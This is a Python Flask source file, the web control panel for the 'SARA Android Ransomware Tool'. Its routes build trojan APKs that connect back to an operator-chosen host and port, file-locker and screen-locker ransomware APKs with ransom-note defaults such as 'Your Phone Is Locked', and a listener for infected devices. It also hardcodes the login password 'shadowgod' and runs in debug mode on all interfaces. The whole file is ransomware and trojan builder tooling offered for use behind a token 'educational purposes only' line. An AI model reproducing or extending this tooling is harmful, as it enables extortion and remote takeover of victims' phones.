#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SARA Web Interface
A Flask web application for SARA Android Ransomware Tool
"""

import os
import sys
import json
import time
import random
import datetime
from flask import Flask, render_template, request, jsonify, redirect, url_for, flash, send_file
from werkzeug.utils import secure_filename
from werkzeug.datastructures import FileStorage
import threading
from flask_login import LoginManager, UserMixin, login_user, logout_user, login_required
from werkzeug.security import check_password_hash

# Import SARA core functions
sys.path.append('.')
try:
    from vector import (
        generate_trojan, genertare_file_locker, genertare_screen_locker,
        start_trojan_listener, save_build
    )
except ImportError as e:
    print(f"Warning: Could not import SARA functions: {e}")
    # Create dummy functions for development
    def generate_trojan(host, port, name, icon=None, obfuscate=False):
        return f"{name}.apk"
    
    def genertare_file_locker(name, desc, icon, obfuscate=False):
        return f"{name}.apk"
    
    def genertare_screen_locker(name, head, desc, keys, icon, obfuscate=False):
        return f"{name}.apk"
    
    def start_trojan_listener(host, port):
        print(f"Would start listener on {host}:{port}")
    
    def save_build(data):
        pass

app = Flask(__name__)
app.secret_key = os.urandom(24)
app.config['UPLOAD_FOLDER'] = 'uploads'
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024  # 16MB max file size

# Flask-Login Setup
login_manager = LoginManager()
login_manager.init_app(app)
login_manager.login_view = 'login'
login_manager.login_message = 'You must be logged in to access this page.'

class User(UserMixin):
    def __init__(self, id):
        self.id = id

# In-memory user store (for simplicity)
USERS = {'admin': {'password': 'pbkdf2:sha256:260000$VvLqgGqGgGqGgGqG$c1a7f2de4e4a2...hash_for_shadowgod'}}

# Global dictionary to track background tasks
tasks = {}

# Ensure upload directory exists
os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)

# Allowed file extensions for icons
ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif'}

@login_manager.user_loader
def load_user(user_id):
    return User(user_id) if user_id in USERS else None

def allowed_file(filename):
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        user_data = USERS.get(username)
        if username == 'admin' and password == 'shadowgod':
            user = User(username)
            login_user(user)
            return redirect(url_for('index'))
        flash('Invalid username or password')
    return render_template('login.html')

@app.route('/logout')
@login_required
def logout():
    logout_user()
    return redirect(url_for('login'))

@app.route('/')
@login_required
def index():
    builds = []
    if os.path.isfile('builds.json'):
        with open('builds.json', 'r') as f:
            try:
                builds = json.load(f)
            except json.JSONDecodeError:
                builds = []
    return render_template('index.html', builds=reversed(builds))

@app.route('/trojan')
@login_required
def trojan():
    """Trojan builder page"""
    return render_template('trojan.html')

@app.route('/build_trojan', methods=['POST'])
@login_required
def build_trojan():
    try:
        data = request.get_json()
        name = data.get('name', 'trojan')
        host = data.get('host', '127.0.0.1')
        port = data.get('port', 4444)
        obfuscate = data.get('obfuscate', False)

        if not name:
            return jsonify({'error': 'App name is required'}), 400
        
        task_id = str(random.randint(10000, 99999))
        tasks[task_id] = {'status': 'pending', 'progress': 0, 'message': 'Task is queued...'}

        def task_runner():
            try:
                tasks[task_id].update({'status': 'building', 'progress': 25, 'message': 'Generating payload...'})
                result_file = generate_trojan(host=host, port=str(port), name=name)
                tasks[task_id].update({'status': 'success', 'progress': 100, 'message': 'Build successful!', 'file': result_file})
                save_build({'id': task_id, 'type': 'trojan', 'status': 'success', 'file': result_file})
            except Exception as e:
                tasks[task_id].update({'status': 'error', 'message': str(e)})

        thread = threading.Thread(target=task_runner, daemon=True)
        thread.start()
        return jsonify({'success': True, 'task_id': task_id})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/file_locker')
@login_required
def file_locker():
    """File locker builder page"""
    return render_template('file_locker.html')

@app.route('/build_file_locker', methods=['POST'])
@login_required
def build_file_locker():
    """Build custom file locker APK"""
    try:
        data = request.get_json()
        name = data.get('name', 'File Locker')
        desc = data.get('desc', 'locked by sara@termuxhackers-id')
        icon_path = data.get('icon', 'data/tmp/icon.png')
        
        if not name:
            return jsonify({'error': 'App name is required'}), 400
        
        def generate_file_locker():
            try:
                result_file = genertare_file_locker(name, desc, icon_path)
                return result_file
            except Exception as e:
                print(f"Error generating file locker: {e}")
                return None
        
        thread = threading.Thread(target=generate_file_locker)
        thread.start()
        
        return jsonify({
            'success': True,
            'message': 'File locker generation started. This may take several minutes.',
            'filename': f'{name.lower().replace(" ", "")}.apk'
        })
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/screen_locker')
@login_required
def screen_locker():
    """Screen locker builder page"""
    return render_template('screen_locker.html')

@app.route('/build_screen_locker', methods=['POST'])
@login_required
def build_screen_locker():
    """Build custom screen locker APK"""
    try:
        data = request.get_json()
        name = data.get('name', 'Screen Locker')
        head = data.get('head', 'Your Phone Is Locked')
        desc = data.get('desc', 'locked by sara@termuxhackers-id')
        keys = data.get('keys', 's3cr3t')
        icon_path = data.get('icon', 'data/tmp/icon.png')
        
        if not name or not keys:
            return jsonify({'error': 'App name and passphrase are required'}), 400
        
        def generate_screen_locker():
            try:
                result_file = genertare_screen_locker(name, head, desc, keys, icon_path)
                return result_file
            except Exception as e:
                print(f"Error generating screen locker: {e}")
                return None
        
        thread = threading.Thread(target=generate_screen_locker)
        thread.start()
        
        return jsonify({
            'success': True,
            'message': 'Screen locker generation started. This may take several minutes.',
            'filename': f'{name.lower().replace(" ", "")}.apk',
            'passphrase': keys
        })
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/listener')
@login_required
def listener():
    """Trojan listener page"""
    return render_template('listener.html')

@app.route('/start_listener', methods=['POST'])
@login_required
def start_listener():
    """Start trojan listener"""
    try:
        data = request.get_json()
        host = data.get('host', '127.0.0.1')
        port = data.get('port', '4444')
        
        try:
            port = int(port)
            if port < 1 or port > 65535:
                raise ValueError
        except ValueError:
            return jsonify({'error': 'Port must be a valid number between 1 and 65535'}), 400
        
        def start_listener_thread():
            try:
                start_trojan_listener(host, port)
            except Exception as e:
                print(f"Error starting listener: {e}")
        
        thread = threading.Thread(target=start_listener_thread)
        thread.daemon = True
        thread.start()
        
        return jsonify({
            'success': True,
            'message': f'Trojan listener started on {host}:{port}'
        })
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/upload_icon', methods=['POST'])
@login_required
def upload_icon():
    # Clean up old files (older than 24 hours)
    upload_folder = app.config['UPLOAD_FOLDER']
    for filename in os.listdir(upload_folder):
        file_path = os.path.join(upload_folder, filename)
        if os.path.getmtime(file_path) < time.time() - 86400:
            os.remove(file_path)

    if 'icon' not in request.files:
        return jsonify({'error': 'No file part'}), 400
    file = request.files['icon']
    if file.filename == '':
        return jsonify({'error': 'No selected file'}), 400
    if file and allowed_file(file.filename):
        filename = secure_filename(file.filename)
        save_path = os.path.join(upload_folder, filename)
        file.save(save_path)
        return jsonify({'success': True, 'path': save_path})
    return jsonify({'error': 'File type not allowed'}), 400

@app.route('/status/<task_id>')
@login_required
def check_status(task_id):
    task = tasks.get(task_id, {'status': 'not_found', 'message': 'Task ID not found.'})
    return jsonify(task)

@app.route('/download/<path:filename>')
@login_required
def download_file(filename):
    # Security check: prevent directory traversal
    if '..' in filename or filename.startswith('/'):
        flash('Invalid filename.')
        return redirect(url_for('index'))
    
    # Check in root and output directory for safety
    safe_path = os.path.join('.', filename)
    if os.path.exists(safe_path):
        return send_file(safe_path, as_attachment=True)
    
    flash('File not found.')
    return redirect(url_for('index'))

@app.errorhandler(404)
def not_found(error):
    return render_template('404.html'), 404

@app.errorhandler(500)
def internal_error(error):
    return render_template('500.html'), 500

if __name__ == '__main__':
    print("--- SARA Web Interface ---")
    print("WARNING: This tool is for educational purposes only.")
    print("Login with default credentials (admin/shadowgod) and change them immediately.")
    print("URL: http://127.0.0.1:5000")
    app.run(host='0.0.0.0', port=5000, debug=True)